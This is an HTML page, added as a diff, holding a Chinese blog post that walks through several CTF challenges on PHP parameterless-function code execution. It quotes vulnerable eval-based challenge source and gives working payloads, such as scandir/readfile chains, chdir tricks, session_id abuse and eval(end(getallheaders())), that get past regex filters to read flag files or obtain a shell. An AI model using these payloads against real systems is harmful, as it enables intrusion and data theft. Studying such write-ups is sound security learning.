@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="gxy禁止套娃之前没来的及看这道题，现在来buu复现一下打开没看到什么提示，想着扫一下目录，但是扫buu直接429了，直接看wp去了git泄露出index.php1234567891011121314151617181920212223&amp;lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&amp;lt;br&amp;gt;&quot;;if(isset($_GET[&apos;exp&apos;]))&amp;#123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php无参数命令执行">
+<meta property="og:url" content="http://yoursite.com/2020/01/21/php无参数命令执行/index.html">
+<meta property="og:site_name" content="cop&#39;s blog">
+<meta property="og:description" content="gxy禁止套娃之前没来的及看这道题，现在来buu复现一下打开没看到什么提示，想着扫一下目录，但是扫buu直接429了，直接看wp去了git泄露出index.php1234567891011121314151617181920212223&amp;lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&amp;lt;br&amp;gt;&quot;;if(isset($_GET[&apos;exp&apos;]))&amp;#123">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://uploader.shimo.im/f/pUf8YWpzglkWFuwV.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/fs7XJqwI1ho4TLRw.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/umn6kc8eNa86Omp2.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/7wkXxVt7Yn8Pvkub.png!thumbnail">
+<meta property="og:image" content="http://static.zybuluo.com/Pdsdt/5lrnzi0t6xvixel5it4a97q7/image.png">
+<meta property="og:updated_time" content="2020-01-22T12:40:30.128Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php无参数命令执行">
+<meta name="twitter:description" content="gxy禁止套娃之前没来的及看这道题，现在来buu复现一下打开没看到什么提示，想着扫一下目录，但是扫buu直接429了，直接看wp去了git泄露出index.php1234567891011121314151617181920212223&amp;lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&amp;lt;br&amp;gt;&quot;;if(isset($_GET[&apos;exp&apos;]))&amp;#123">
+<meta name="twitter:image" content="https://uploader.shimo.im/f/pUf8YWpzglkWFuwV.png!thumbnail">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/21/php无参数命令执行/">
+
+
+
+
+
+  <title>php无参数命令执行 | cop's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cop's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/php无参数命令执行/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cop">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cop's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php无参数命令执行</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T18:40:27+08:00">
+                2020-01-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="gxy禁止套娃"><a href="#gxy禁止套娃" class="headerlink" title="gxy禁止套娃"></a>gxy禁止套娃</h2><p>之前没来的及看这道题，现在来buu复现一下<br>打开没看到什么提示，想着扫一下目录，但是扫buu直接429了，直接看wp去了<br>git泄露出index.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z|\-]+\((?R)?\)/'</span>, NULL, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|nt|info|dec|bin|hex|oct|pi|log/i'</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                // <span class="built_in">echo</span> <span class="variable">$_GET</span>[<span class="string">'exp'</span>];</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br></pre></td></tr></table></figure></p>
+<p>(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数<br>得到文件名可以用scandir()函数扫描当前目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">'.'</span>));</span><br></pre></td></tr></table></figure></p>
+<p>得到 .<br>1.chr(46)<br>得到46有三种方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chr(rand()) </span><br><span class="line">chr(time())</span><br><span class="line">chr(current(localtime(time())))</span><br></pre></td></tr></table></figure></p>
+<p>前两种看人品，最后一种localtime(time())的返回一个数组，Array[0]为一个0~60之间的数字，每秒加1，所以最多一分钟就可以得到46。由于<br>php数组内部指针默认指向第一个元素，所以current()或pos()取数组中当前元素的值，就得到了这个数字。<br>操作数组的函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">end() – 将内部指针指向数组中的最后一个元素，并输出 </span><br><span class="line">next() – 将内部指针指向数组中的下一个元素，并输出 </span><br><span class="line">prev() – 将内部指针指向数组中的上一个元素，并输出 </span><br><span class="line">reset() – 将内部指针指向数组中的第一个元素，并输出 </span><br><span class="line">each() – 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure></p>
+<p>2.current(localeconv())<br>localeconv() 函数返回一包含本地数字及货币格式信息的数组，current(localeconv())永远都是个点</p>
+<p>3.phpversion()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phpversion()返回php版本，如7.3.5 f</span><br><span class="line">loor(phpversion())返回7 </span><br><span class="line">sqrt(floor(phpversion()))返回2.6457513110646 </span><br><span class="line">tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615 </span><br><span class="line">cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491 </span><br><span class="line">sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156 </span><br><span class="line">ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46 </span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回. </span><br><span class="line">var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))扫描当前目录 </span><br><span class="line">next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))返回..</span><br></pre></td></tr></table></figure></p>
+<p>4.crypt()<br>原文链接 <a href="https://www.jianshu.com/p/060d16584b8e" target="_blank" rel="noopener">https://www.jianshu.com/p/060d16584b8e</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ord(hebrevc(crypt(<span class="built_in">chdir</span>(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))); </span><br><span class="line">原理：hebrevc(crypt(arg))可以随机生成一个<span class="built_in">hash</span>值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符 </span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">chdir</span>(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); </span><br><span class="line">原理：crypt(serialize(array())) 原因同上</span><br></pre></td></tr></table></figure></p>
+<p>现在可以构造payload扫描当前目录了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://uploader.shimo.im/f/pUf8YWpzglkWFuwV.png!thumbnail" alt><br>可以看到flag.php在数组的第四个元素<br>1.用array_reverse()可以以相反元素的顺序返回数组，这样就可以用next()获取flag.php了</p>
+<p>2.array_rand(array_flip())<br>array_flip()交换数组的键和值 ?exp=print_r(array_flip(scandir(current(localeconv()))));<br><img src="https://uploader.shimo.im/f/fs7XJqwI1ho4TLRw.png!thumbnail" alt><br>array_rand() 函数返回数组中的一个随机键名，或者如果指定函数返回键名不只一个，则返回一个包含随机键名的数组，不断刷新访问就会不断<br>随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php<br>?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));<br><img src="https://uploader.shimo.im/f/umn6kc8eNa86Omp2.png!thumbnail" alt></p>
+<p>3.session_id(session_start())<br>sky师傅的<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E5%9B%9B%EF%BC%9Asession-id" target="_blank" rel="noopener">文章</a>里介绍了这种方法<br>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身<br>就支持的。 使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。 session_id()可以获取到当前<br>的session id。 手动设置名为PHPSESSID的cookie，并设置值为flag.php<br>?exp=print_r(session_id(session_start()));<br><img src="https://uploader.shimo.im/f/7wkXxVt7Yn8Pvkub.png!thumbnail" alt></p>
+<p>下面就是读flag.php了，因为et被ban了，所以不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函<br>数show_source()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv())))))); <span class="comment">#f12看源码，去掉print_r也可以读文件</span></span><br><span class="line">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure></p>
+<p>最后附上这位师傅的<a href="https://www.gem-love.com/websecurity/530.html" target="_blank" rel="noopener">博客</a>，思路完全是跟着这位师傅来的，而且他的总结也很完整，每一<br>步的方法都很多，我基本就是复制原博文了2333，学到了很多</p>
+<h2 id="ByteCTF-Boringcode"><a href="#ByteCTF-Boringcode" class="headerlink" title="ByteCTF Boringcode"></a>ByteCTF Boringcode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$code</span> = file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, NULL, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>url有个正则是末尾要baidu.com，这个直接买个域名就行了<br>然后这个和上面那个不同的是不能有下划线，那只能用readfile读文件了<br>这里还有一个不同点是flag文件在上一级目录，要用chdir函数改变目录<br>贴上几个payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">chdir</span>(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</span><br><span class="line"><span class="comment"># 使用chdir()函数，更改目录，返回1的同时，读取目录下的文件</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>(readfile(end(scandir(chr(pos(localtime(time(<span class="built_in">chdir</span>(next(scandir(pos(localeconv()))))))))))));</span><br><span class="line"><span class="comment"># 通过chdir修改当前目录，通过localtime()等函数构造chr（46）即“.”达到读取上层目录文件的目的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>(readfile(end(scandir(chr(pos(localtime(time(<span class="built_in">chdir</span>(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br><span class="line"><span class="comment"># 同样的原理，不过生成chr(46)的方式不同</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#time()返回时间戳，有没有参数无关</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="2019上海市大学生网络安全大赛-decade"><a href="#2019上海市大学生网络安全大赛-decade" class="headerlink" title="2019上海市大学生网络安全大赛_decade"></a>2019上海市大学生网络安全大赛_decade</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">'code'</span>];</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, NULL, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"invalid"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"invalid"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这道题和ByteCTF Boringcode类似，不过过滤的函数比较多<br>首先readflie被过滤了，fuzz一下，php中类似readfile的函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php var_dump(get_defined_functions());?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现readgzfile这个函数，看一下函数的定义<br><img src="http://static.zybuluo.com/Pdsdt/5lrnzi0t6xvixel5it4a97q7/image.png" alt><br>主要是读取一个压缩文件，不过在本地测试时发现，该函数也可以实现readfile的功能去读取文件</p>
+<p>然后是如何得到. 做gxy的时候.有四种方法可以得到，这道题过滤了rand time local sqrt，只能用第四种方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chr(ord(hebrevc(crypt(phpversion()))))</span><br><span class="line">或</span><br><span class="line">chr(ord(strrev(crypt(serialize(array())))))</span><br><span class="line">因为crypt的随机性，所以要多刷新几次</span><br></pre></td></tr></table></figure></p>
+<p>然后就可以用配合readgzfile读flag文件了</p>
+<h2 id="极客大挑战——Eval-evil-code"><a href="#极客大挑战——Eval-evil-code" class="headerlink" title="极客大挑战——Eval evil code"></a>极客大挑战——Eval evil code</h2><p>这道题因为没有做过滤，所以可以getshell<br>命令写在head头的最后一行 格式为一个冒号加命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(end(getallheaders()));</span><br></pre></td></tr></table></figure></p>
+<p>详情参考这位师傅<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#Eval_evil_code" target="_blank" rel="noopener">博客</a><br>这道题也可以用eval(hex2bin(session_id(session_start()))) 包含session来getshell</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/19/极客大挑战刷题记录/" rel="next" title="极客大挑战刷题记录">
+                <i class="fa fa-chevron-left"></i> 极客大挑战刷题记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/22/CISCN2019/" rel="prev" title="CISCN2019">
+                CISCN2019 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cop</p>
+              <p class="site-description motion-element" itemprop="description">cop's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#gxy禁止套娃"><span class="nav-number">1.</span> <span class="nav-text">gxy禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ByteCTF-Boringcode"><span class="nav-number">2.</span> <span class="nav-text">ByteCTF Boringcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019上海市大学生网络安全大赛-decade"><span class="nav-number">3.</span> <span class="nav-text">2019上海市大学生网络安全大赛_decade</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战——Eval-evil-code"><span class="nav-number">4.</span> <span class="nav-text">极客大挑战——Eval evil code</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cop</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
